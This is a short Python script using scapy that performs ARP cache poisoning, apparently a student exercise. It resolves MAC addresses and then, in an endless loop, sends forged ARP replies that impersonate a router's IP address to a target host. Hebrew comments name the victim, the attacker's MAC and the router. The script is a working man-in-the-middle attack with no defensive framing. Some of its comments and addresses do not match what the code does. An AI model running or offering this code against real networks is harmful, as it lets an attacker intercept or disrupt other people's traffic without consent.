#ARP Poison
from scapy.all import *
from scapy.layers.l2 import ARP,Ether

def getMAC(targetip):
    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1,pdst=targetip)
    targetmac = srp(arppacket,timeout=2,verbose=False)[0][0][1].hwsrc
    return targetmac

def spoofarpcache(targetip,targetmac,sourceip):
    spoofed = ARP(op=2, pdst=targetip,psrc= sourceip,hwdst=targetmac)
    send(spoofed, verbose=False)
# targetip - זה הכתובת של המחשב שאנו רוצים לתקוף
#targetmac -  זה הכתובת מאק של התוקף
#sourceip - זה הכתובת של הראוטר

print(getMAC("172.20.137.98"))
print(getMAC("172.20.159.254"))

while True:
    spoofarpcache("172.20.138.104","00:EE:00:BB:6E:65","172.20.159.254")